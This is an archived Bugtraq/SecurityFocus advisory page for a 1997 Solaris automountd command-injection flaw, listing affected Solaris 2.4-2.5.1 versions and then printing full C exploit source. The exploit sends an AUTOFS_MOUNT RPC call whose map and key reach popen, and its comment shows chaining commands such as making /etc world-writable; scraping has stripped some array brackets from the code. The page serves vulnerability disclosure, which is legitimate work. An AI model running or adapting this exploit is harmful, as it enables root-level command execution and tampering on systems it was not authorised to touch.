<p><b><span style="font-size: 18pt;">Solaris automount Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/235/info">info</a><br><a href="http://www.securityfocus.com/bid/235/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/235/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/235/solution">solution</a><br><a href="http://www.securityfocus.com/bid/235/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
<span class="title"></span><br/><br/>
<table border="0" cellpadding="4" cellspacing="0">
<tr>
<td>
<span class="label">Bugtraq ID:</span>
</td>
<td>
				235
			</td>
</tr>
<tr>
<td>
<span class="label">Class:</span>
</td>
<td>
				Origin Validation Error
			</td>
</tr>
<tr valign="top">
<td>
<span class="label">CVE:</span>
</td>
<td>
</td>
</tr>
<tr>
<td>
<span class="label">Remote:</span>
</td>
<td>
				Yes
			</td>
</tr>
<tr>
<td>
<span class="label">Local:</span>
</td>
<td>
				Yes
			</td>
</tr>
<tr>
<td>
<span class="label">Published:</span>
</td>
<td>
				Nov 26 1997 12:00AM
			</td>
</tr>
<tr>
<td>
<span class="label">Updated:</span>
</td>
<td>
				Nov 26 1997 12:00AM
			</td>
</tr>
<tr>
<td>
<span class="label">Credit:</span>
</td>
<td>
				This vulnerability was posted by an anonymous poster to the Bugtraq mailing list Nov. 27, 1997. Furthermore, Corruptio Optimi Pessima (corruptio@HOTMAIL.COM) Mon, 4 Jan 1999 discovered the patches issued were not sufficient. The issue of RPC bouncing throu
			</td>
</tr>
<tr valign="top">
<td>
<span class="label">Vulnerable:</span>
</td>
<td>
				
					Sun Solaris 2.5.1 _x86<br/>
					
				
					Sun Solaris 2.5.1 <br/>
					
				
					Sun Solaris  2.5_x86<br/>
					
				
					Sun Solaris  2.5<br/>
					
				
					Sun Solaris  2.4_x86<br/>
					
				
					Sun Solaris  2.4<br/>
</td>
</tr>
<tr>
<td colspan="2">
<div class="breakline"></div>
</td>
</tr>
<tr valign="top">
<td>
<span class="label">Not Vulnerable:</span>
</td>
<td>
</td>
</tr>
</table>
</div><br><br>#<br>##no_exploit<br><br><br><br>#<br>#<div id="vulnerability">
<span class="title"></span><br/><br/>
	/*<br/> this is really dumb automountd exploit, tested on solaris 2.5.1<br/> ./r blahblah /bin/chmod "777 /etc; 2nd cmd;3rd cmd" and so on,<br/> map is executed via popen with key given as argument, read automount(1M)<br/><br/> patch 1046545 fixes this<br/><br/> */<br/><br/>#include &lt;sys/types.h&gt;<br/>#include &lt;sys/time.h&gt;<br/>#include &lt;stdio.h&gt;<br/>#include &lt;netdb.h&gt;<br/>#include &lt;rpc/rpc.h&gt;<br/>#include &lt;rpcsvc/autofs_prot.h&gt;<br/><br/>#define AUTOTS "datagram_v" /* XXX */<br/><br/>void usage(char *s) {<br/>  printf("Usage: %s mountpoint map key opts\n", s);<br/>  exit(0);<br/>}<br/><br/>bool_t<br/>xdr_mntrequest(xdrs, objp)<br/>        register XDR *xdrs;<br/>        mntrequest *objp;<br/>{<br/><br/>        register long *buf;<br/><br/>        if (!xdr_string(xdrs, &amp;objp-&gt;name, A_MAXNAME))<br/>                return (FALSE);<br/>        if (!xdr_string(xdrs, &amp;objp-&gt;map, A_MAXNAME))<br/>                return (FALSE);<br/>        if (!xdr_string(xdrs, &amp;objp-&gt;opts, A_MAXOPTS))<br/>                return (FALSE);<br/>        if (!xdr_string(xdrs, &amp;objp-&gt;path, A_MAXPATH))<br/>                return (FALSE);<br/>        return (TRUE);<br/>}<br/><br/>bool_t<br/>xdr_mntres(xdrs, objp)<br/>        register XDR *xdrs;<br/>        mntres *objp;<br/>{<br/><br/>        register long *buf;<br/><br/>        if (!xdr_int(xdrs, &amp;objp-&gt;status))<br/>                return (FALSE);<br/>        return (TRUE);<br/>}<br/><br/>main(int argc, char *argv) {<br/>  char hostnameMAXHOSTNAMELEN;<br/>  CLIENT *cl;<br/>  enum clnt_stat stat;<br/>  struct timeval tm;<br/>  struct mntrequest req;<br/>  struct mntres result;<br/><br/>  if (argc &lt; 4)<br/>    usage(argv0);<br/><br/>  req.path=argv1;<br/>  req.map=argv2;<br/>  req.name=argv3;<br/>  req.opts=argv4;<br/>  if (gethostname(hostname, sizeof(hostname)) == -1) {<br/>    perror("gethostname");<br/>    exit(0);<br/>  }<br/>  if ((cl=clnt_create(hostname, AUTOFS_PROG, AUTOFS_VERS, AUTOTS)) == NULL) {<br/>    clnt_pcreateerror("clnt_create");<br/>    exit(0);<br/>  }<br/>  tm.tv_sec=5;<br/>  tm.tv_usec=0;<br/>  stat=clnt_call(cl, AUTOFS_MOUNT, xdr_mntrequest, (char *)&amp;req, xdr_mntres,<br/>                (char *)&amp;result, tm);<br/>  if (stat != RPC_SUCCESS)<br/>    clnt_perror(cl, "mount call");<br/>  else<br/>    printf("mntres = %d.\n", result.status);<br/>  clnt_destroy(cl);<br/>}
	
		<ul>
</ul>
</div>